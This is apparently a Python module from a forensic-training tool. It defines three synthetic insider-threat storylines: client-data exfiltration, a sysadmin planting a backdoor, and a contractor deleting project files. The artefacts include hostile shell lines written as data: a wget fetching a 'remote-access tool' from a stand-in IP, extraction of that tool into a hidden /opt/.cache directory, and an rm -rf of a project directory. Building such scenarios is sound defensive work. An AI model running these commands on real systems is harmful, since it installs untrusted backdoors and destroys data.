"""Demo forensic storylines.

Three distinct narratives, not variations on one theme - partly to give
the evaluation set (report.py's aggregate_reports()) more than one data
point, and partly a first, small step on the "only one spec family has
real coverage" gap flagged at the end of week 4. It's only a partial
step: varying `base_spec`'s wording changes what's asked for, but the
RAG corpus (knowledge/) is still SSH/sshd_config-focused, so retrieval
will likely still surface SSH-flavoured snippets regardless of the
spec's own framing. Broadening the corpus itself is real work for
another week, not something solved by phrasing alone - see
docs/METHODOLOGY.md (week 5).

All content is Faker-generated at import time (see generators.py) - every
name, email, IP, and timestamp below is synthetic.
"""

from datetime import datetime, timedelta

from . import generators as gen
from .storyline import Artefact, Storyline

_NOW = datetime(2026, 8, 15, 9, 0, 0)  # a fixed reference date keeps demo timelines readable


def departing_employee_exfiltration() -> Storyline:
    last_day = _NOW
    login_time = last_day - timedelta(days=1, hours=7)  # ~02:00 the night before
    premeditation_date = last_day - timedelta(days=18)

    return Storyline(
        id="departing-employee-exfiltration",
        title="Departing employee suspected of exfiltrating client data",
        narrative=(
            "An employee handed in their resignation two and a half weeks ago and is due to "
            "leave the company today. IT flagged an off-hours login to their workstation the "
            "night before their last day. The employee is suspected of copying client records "
            "off the machine before departure, and of covering their tracks afterward."
        ),
        base_spec="Ubuntu workstation for a corporate employee, standard office setup",
        artefacts=[
            Artefact(
                kind="log_entry",
                description="Off-hours login the night before departure",
                target_path="/var/log/auth.log",
                content=gen.auth_log_entry("Accepted publickey", login_time, user="j.moore"),
            ),
            Artefact(
                kind="shell_history",
                description="Archiving client records before departure",
                target_path="/home/vagrant/.bash_history",
                content=gen.shell_command_archive("/home/vagrant/Documents/clients"),
            ),
            Artefact(
                kind="shell_history",
                description="Copying the archive off the workstation",
                target_path="/home/vagrant/.bash_history",
                content=gen.shell_command_exfiltration(),
            ),
            Artefact(
                kind="shell_history",
                description="Attempting to clear shell history afterward",
                target_path="/home/vagrant/.bash_history",
                content=gen.shell_command_history_clear(),
            ),
            Artefact(
                kind="deleted_file",
                description="Exported client records, deleted after copying",
                target_path="/home/vagrant/Documents/clients/export.csv",
                content=gen.fake_client_records_csv(rows=20),
            ),
            Artefact(
                kind="backdated_file",
                description="Draft note planning departure, predating the resignation",
                target_path="/home/vagrant/.local/share/notes/plan.txt",
                content="Things to sort before I go - back up my contacts, tidy up the client folder.\n",
                timestamp=premeditation_date.isoformat(),
            ),
            Artefact(
                kind="email_draft",
                description="Draft email to a personal address referencing the export",
                target_path="/home/vagrant/Drafts/for_later.eml",
                content=gen.email_draft(
                    subject="For later",
                    body="Grabbed a copy of the client list before I leave, should be useful for the new role.",
                    recipient="jmoore.personal@example.net",
                ),
            ),
        ],
    )


def unauthorized_backdoor_install() -> Storyline:
    placed_on_leave = _NOW
    install_time = placed_on_leave - timedelta(days=3, hours=10)
    planning_date = placed_on_leave - timedelta(days=25)

    return Storyline(
        id="unauthorized-backdoor-install",
        title="Sysadmin suspected of installing unauthorized remote access before leave",
        narrative=(
            "A system administrator was placed on administrative leave three days ago pending "
            "an internal review. Security noticed an unfamiliar SSH key had been added to a "
            "production file server shortly before the review began, alongside a downloaded "
            "tool of unclear purpose that no longer appears on disk."
        ),
        base_spec="Ubuntu server acting as an internal file server for a small engineering team",
        artefacts=[
            Artefact(
                kind="log_entry",
                description="New SSH key accepted outside normal admin hours",
                target_path="/var/log/auth.log",
                content=gen.auth_log_entry("Accepted publickey (new key)", install_time, user="root"),
            ),
            Artefact(
                kind="shell_history",
                description="Downloading an unfamiliar remote-access tool",
                target_path="/root/.bash_history",
                content="wget http://198.51.100.42/support-tools/rtool.tar.gz -O /tmp/rtool.tar.gz",
            ),
            Artefact(
                kind="shell_history",
                description="Extracting and preparing the downloaded tool",
                target_path="/root/.bash_history",
                content="tar -xzf /tmp/rtool.tar.gz -C /opt/.cache && chmod +x /opt/.cache/rtool",
            ),
            Artefact(
                kind="deleted_file",
                description="Downloaded tool archive, removed after installation",
                target_path="/tmp/rtool.tar.gz",
                content="(placeholder binary content for a fictitious remote-access tool)\n",
            ),
            Artefact(
                kind="backdated_file",
                description="Planning note for the install, predating the review",
                target_path="/root/.cache/notes.txt",
                content="Set up fallback access before the audit starts, use the usual port.\n",
                timestamp=planning_date.isoformat(),
            ),
        ],
    )


def sabotage_before_offboarding() -> Storyline:
    offboarding_date = _NOW
    deletion_time = offboarding_date - timedelta(hours=6)

    return Storyline(
        id="sabotage-before-offboarding",
        title="Contractor suspected of deleting project files before contract end",
        narrative=(
            "A contractor was told this morning that their contract will not be renewed. "
            "Hours later, several files went missing from the shared project directory on "
            "their development VM, and their shell history shows repeated attempts to access "
            "areas of the filesystem outside their usual scope shortly beforehand."
        ),
        base_spec="Ubuntu development VM with a shared project repository for a small dev team",
        artefacts=[
            Artefact(
                kind="log_entry",
                description="Repeated failed privilege escalation attempts before deletion",
                target_path="/var/log/auth.log",
                content=gen.auth_log_entry("authentication failure", deletion_time - timedelta(minutes=20), user="contractor"),
            ),
            Artefact(
                kind="shell_history",
                description="Deleting the shared project directory",
                target_path="/home/vagrant/.bash_history",
                content="rm -rf /srv/projects/client-portal/*",
            ),
            Artefact(
                kind="shell_history",
                description="Attempting to clear shell history afterward",
                target_path="/home/vagrant/.bash_history",
                content=gen.shell_command_history_clear(),
            ),
            Artefact(
                kind="deleted_file",
                description="Manifest of the project contents, deleted alongside the project files",
                target_path="/srv/projects/client-portal/MANIFEST.txt",
                content="client-portal/ - contains 40 source files and the shared asset library.\n",
            ),
            Artefact(
                kind="email_draft",
                description="Draft email hinting at taking work to a new client",
                target_path="/home/vagrant/Drafts/next_steps.eml",
                content=gen.email_draft(
                    subject="Next steps",
                    body="No point leaving good work behind for people who won't renew me - keeping a copy for the new contract.",
                ),
            ),
        ],
    )


ALL_SCENARIOS: dict[str, Storyline] = {
    s.id: s
    for s in (
        departing_employee_exfiltration(),
        unauthorized_backdoor_install(),
        sabotage_before_offboarding(),
    )
}
